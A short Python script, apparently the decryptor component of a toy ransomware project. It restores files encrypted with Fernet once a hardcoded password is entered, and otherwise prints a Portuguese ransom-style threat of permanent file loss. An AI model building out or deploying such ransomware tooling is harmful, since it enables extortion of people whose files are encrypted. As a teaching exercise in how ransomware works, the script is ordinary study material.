import os
from cryptography.fernet import Fernet

files = []

key = Fernet.generate_key()

with open("chave.key", "rb") as key:
    secretkey = key.read()

for file in os.listdir():
    if file == "ransom.py" or file == "chave.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

senha = "cybersecurity"
senha_digitada = input("Coloque a senha correta para decryptar os seus arquivos: ")

if senha_digitada == senha:
    for file in files:
        with open(file, "rb") as arquivo:
            conteudo = arquivo.read()
        conteudo_decrypted = Fernet(secretkey).decrypt(conteudo)
        with open(file, "wb") as arquivo:
            arquivo.write(conteudo_decrypted)
    print("Seus arquivos foram recuperados com sucesso!")
else:
    print("Senha incorreta, digite a senha correta ou perca seus arquivos para sempre!")